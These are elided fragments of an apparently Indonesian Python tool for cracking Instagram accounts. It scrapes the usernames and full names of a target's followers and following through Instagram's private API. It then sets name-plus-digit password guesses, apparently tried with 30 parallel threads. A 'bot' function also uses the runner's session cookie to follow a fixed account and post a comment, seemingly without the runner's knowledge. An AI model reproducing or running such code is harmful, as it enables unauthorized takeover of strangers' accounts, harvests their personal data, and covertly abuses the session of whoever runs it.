...
from concurrent.futures import ThreadPoolExecutor as rakaXZ
...
def bot(ku_jangan_di_ganti_asu,token):
    with requests.Session() as xyzu:
         try:
              ...
              data = {
                 "comment_text": komen}
              posh = xyzu.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("5"), headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
              posx = xyzu.post("https://i.instagram.com/api/v1/web/comments/2/add/", data=data, headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
...
class dump:
    ...
    def followers(self, userid, cookies, dev):
        with requests.Session() as kontol:
               try:
                     self.url = kontol.get("https://i.instagram.com/api/v1/friendships/{}/followers/?count=100&max_id={}".format(userid,dev), headers = {"user-agent":ua_ig}, cookies = {"cookie":cookies})
    ...
    def following(self, userid, cookies, dev):
          with requests.Session() as kontol:
               try:
                     self.url = kontol.get("https://i.instagram.com/api/v1/friendships/{}/following/?count=100&max_id={}".format(userid, dev), headers = {"user-agent":ua_ig}, cookies = {"cookie":cookies})
                     for self.txt in json.loads(self.url.text)["users"]:
                         if self.txt["username"] in self.id:
                              continue
                         self.id.append(self.txt["username"]+"<=>"+self.txt["full_name"])
...
[bold white][[bold green]3[bold white]] sandi : nama,nama123,nama1234,nama12345 ++''','color(8)')
        ...
        ulfah(okeh_,'color(8)')
        with rakaXZ(max_workers=30) as coid:
